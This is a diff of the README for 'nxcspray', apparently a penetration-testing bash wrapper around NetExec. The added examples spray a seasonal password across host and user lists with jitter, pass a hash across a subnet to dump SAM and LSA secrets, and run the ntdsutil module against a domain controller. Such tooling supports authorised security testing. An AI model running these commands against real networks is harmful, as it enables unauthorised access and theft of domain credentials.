@@ -1,4 +1,4 @@
-# nxcspray
+# nxcspray - NetExec (nxc) spraying / enumeration wrapper
 Simple bash script to spray known credentials against multiple services with netexec (https://www.netexec.wiki/)
 
 # Installation
@@ -12,8 +12,8 @@ chmod +x /usr/local/bin/nxcspray
 
 # Usage
 ```
-└─$ nxcspray -h                 
-[-] Usage: nxcspray <protocols|all> <targets> -u <username> -p <password>
+└─$ nxcspray -h, --help                 
+[-] nxcspray <protocols|all> <targets> [auth] [spray-safety] [dump toggles] [-- <raw nxc args>]
 ```
 
 Example Usage
@@ -29,3 +29,14 @@ nxcspray all 10.1.45.200 -u e.hills -p 'Il0vemyj0b2025!'
 ```
 <img width="1315" height="365" alt="image" src="https://github.com/user-attachments/assets/65453924-98c5-44c1-975c-bfb40968ef88" />
 
+'''
+nxcspray all hosts.txt -u users.txt -p 'Spring2026!' --continue-on-success --jitter 2-5
+'''
+
+'''
+nxcspray smb 10.0.0.0/24 -u administrator -H aad3b...:31d6c... --local-auth --sam --lsa
+'''
+
+'''
+nxcspray smb dc01.corp.local -u svc -p Pass1 -d corp.local -- -M ntdsutil
+'''
